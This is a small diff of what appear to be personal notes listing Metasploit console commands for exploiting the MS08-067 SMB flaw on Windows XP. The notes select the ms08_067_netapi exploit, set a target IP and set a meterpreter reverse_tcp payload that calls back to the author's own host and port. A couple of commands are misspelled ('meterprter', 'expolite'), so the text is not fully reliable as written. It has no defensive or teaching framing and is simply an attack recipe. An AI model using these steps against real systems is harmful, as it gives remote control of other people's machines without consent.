@@ -1,9 +1,10 @@
 search netapi
 use exploit/windows/smb/ms08_067_netapi
-show options
+show options # needed to show
 set rhost <ip of pc>
 set payload  windows/meterprter/reverse_tcp
-show options
 set lhost <my ip>
 set lport <enter any port>
 expolite #gl
+
+## works with windows xp home only
